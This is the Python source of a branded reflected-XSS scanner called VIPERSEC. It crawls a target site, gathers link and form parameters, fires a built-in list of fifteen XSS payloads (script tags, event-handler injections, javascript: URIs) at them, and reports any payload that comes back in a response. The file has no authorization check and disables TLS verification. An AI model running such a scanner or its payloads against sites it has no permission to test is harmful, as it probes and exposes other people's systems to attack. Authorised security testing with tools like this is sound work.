#!/usr/bin/env python3
"""
VIPERSEC XSS Auto Scanner
Automatically crawls + discovers parameters + tests for reflected XSS
Supports custom payload files
Website: https://vipersec.xyz
"""

import requests
import argparse
import sys
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

BANNER = f"""
{Fore.RED}
██╗   ██╗██╗██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗
██║   ██║██║██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
██║   ██║██║██████╔╝█████╗  ██████╔╝███████╗█████╗  ██║     
╚██╗ ██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██╔══╝  ██║     
 ╚████╔╝ ██║██║     ███████╗██║  ██║███████║███████╗╚██████╗
  ╚═══╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝
{Style.RESET_ALL}
{Fore.CYAN}     Auto XSS Scanner  |  Crawl + Detect  |  vipersec.xyz{Style.RESET_ALL}
"""

# Default payloads (used only if no custom file is given)
DEFAULT_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "\" onfocus=alert(1) autofocus=\"",
    "' onfocus=alert(1) autofocus='",
    "<math><mtext></math><img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
]

COMMON_PARAMS = ["q", "query", "search", "s", "id", "page", "name", "keyword", "term", "text", "input"]


def load_payloads(file_path):
    """Load payloads from a text file (one payload per line)"""
    payloads = []
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):  # skip empty lines and comments
                    payloads.append(line)
        print(f"{Fore.GREEN}[+] Loaded {len(payloads)} payloads from {file_path}{Style.RESET_ALL}")
        return payloads
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to load payload file: {e}{Style.RESET_ALL}")
        sys.exit(1)


class ViperSecXSS:
    def __init__(self, base_url, payloads, threads=5, timeout=8, max_pages=30):
        self.base_url = base_url.rstrip("/")
        self.domain = urlparse(base_url).netloc
        self.payloads = payloads
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "VIPERSEC-XSS-Scanner/2.1 (+https://vipersec.xyz)"
        })
        self.session.verify = False
        self.timeout = timeout
        self.threads = threads
        self.max_pages = max_pages
        self.visited = set()
        self.injection_points = []
        self.findings = []

    def is_same_domain(self, url):
        try:
            return urlparse(url).netloc == self.domain or urlparse(url).netloc == ""
        except:
            return False

    def normalize(self, url):
        parsed = urlparse(url)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, parsed.query, ""))

    def crawl(self, start_url):
        print(f"{Fore.CYAN}[*] Starting crawl on {start_url}{Style.RESET_ALL}")
        queue = [start_url]
        self.visited.add(self.normalize(start_url))

        while queue and len(self.visited) < self.max_pages:
            url = queue.pop(0)
            try:
                r = self.session.get(url, timeout=self.timeout)
                soup = BeautifulSoup(r.text, "html.parser")

                # Extract links
                for a in soup.find_all("a", href=True):
                    link = urljoin(url, a["href"])
                    link = self.normalize(link)
                    if self.is_same_domain(link) and link not in self.visited:
                        self.visited.add(link)
                        queue.append(link)

                        parsed = urlparse(link)
                        if parsed.query:
                            params = parse_qs(parsed.query)
                            self.injection_points.append({
                                "url": link,
                                "method": "GET",
                                "params": list(params.keys())
                            })

                # Extract forms
                for form in soup.find_all("form"):
                    action = form.get("action")
                    method = form.get("method", "get").upper()
                    form_url = urljoin(url, action) if action else url
                    form_url = self.normalize(form_url)

                    inputs = []
                    for inp in form.find_all(["input", "textarea", "select"]):
                        name = inp.get("name")
                        if name:
                            inputs.append(name)

                    if inputs:
                        self.injection_points.append({
                            "url": form_url,
                            "method": method,
                            "params": inputs
                        })

            except Exception as e:
                print(f"{Fore.YELLOW}[!] Crawl error on {url}: {e}{Style.RESET_ALL}")

        # Force common search endpoints
        for path in ["/search", "/search.jsp", "/search.php", "/index.jsp", "/"]:
            test_url = urljoin(self.base_url, path)
            for param in COMMON_PARAMS:
                self.injection_points.append({
                    "url": f"{test_url}?{param}=test",
                    "method": "GET",
                    "params": [param]
                })

        # Deduplicate
        unique = []
        seen = set()
        for point in self.injection_points:
            key = (point["url"].split("?")[0], point["method"], tuple(sorted(point["params"])))
            if key not in seen:
                seen.add(key)
                unique.append(point)
        self.injection_points = unique

        print(f"{Fore.GREEN}[+] Crawled {len(self.visited)} pages{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found {len(self.injection_points)} potential injection points{Style.RESET_ALL}\n")

    def test_point(self, point):
        findings = []
        base = point["url"].split("?")[0]
        method = point["method"]
        params = point["params"]

        for param in params:
            for payload in self.payloads:
                try:
                    if method == "GET":
                        test_params = {param: payload}
                        original_query = parse_qs(urlparse(point["url"]).query)
                        for k, v in original_query.items():
                            if k != param:
                                test_params[k] = v[0]
                        full_url = f"{base}?{urlencode(test_params)}"
                        r = self.session.get(full_url, timeout=self.timeout)
                    else:
                        data = {p: "test" for p in params}
                        data[param] = payload
                        r = self.session.post(base, data=data, timeout=self.timeout)
                        full_url = base

                    if payload in r.text:
                        findings.append({
                            "url": full_url,
                            "param": param,
                            "payload": payload,
                            "method": method
                        })
                        break  # Found one → move to next parameter
                except:
                    continue
        return findings

    def scan(self):
        print(f"{Fore.CYAN}[*] Testing with {len(self.payloads)} payloads...{Style.RESET_ALL}")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_point, point) for point in self.injection_points]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.findings.extend(result)

        # Deduplicate findings
        unique_findings = []
        seen = set()
        for f in self.findings:
            key = (f["url"], f["param"], f["payload"])
            if key not in seen:
                seen.add(key)
                unique_findings.append(f)
        self.findings = unique_findings

    def report(self):
        if self.findings:
            print(f"\n{Fore.GREEN}[+] VIPERSEC found {len(self.findings)} potential XSS:{Style.RESET_ALL}")
            for i, f in enumerate(self.findings, 1):
                print(f"\n{Fore.GREEN}[{i}]{Style.RESET_ALL}")
                print(f"  Method    : {f['method']}")
                print(f"  Parameter : {Fore.YELLOW}{f['param']}{Style.RESET_ALL}")
                print(f"  Payload   : {Fore.RED}{f['payload']}{Style.RESET_ALL}")
                print(f"  URL       : {f['url']}")
        else:
            print(f"\n{Fore.YELLOW}[-] No reflected XSS detected.{Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}[*] Scan finished | VIPERSEC - vipersec.xyz{Style.RESET_ALL}")


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="VIPERSEC Auto XSS Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target base URL")
    parser.add_argument("-p", "--payloads", help="Custom payload file (one payload per line)")
    parser.add_argument("-t", "--threads", type=int, default=6, help="Number of threads")
    parser.add_argument("--timeout", type=int, default=8, help="Request timeout")
    parser.add_argument("--max-pages", type=int, default=25, help="Max pages to crawl")
    args = parser.parse_args()

    # Load payloads
    if args.payloads:
        payloads = load_payloads(args.payloads)
    else:
        payloads = DEFAULT_PAYLOADS
        print(f"{Fore.CYAN}[*] Using {len(payloads)} default payloads{Style.RESET_ALL}")

    scanner = ViperSecXSS(
        base_url=args.url,
        payloads=payloads,
        threads=args.threads,
        timeout=args.timeout,
        max_pages=args.max_pages
    )

    scanner.crawl(args.url)
    scanner.scan()
    scanner.report()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(0)
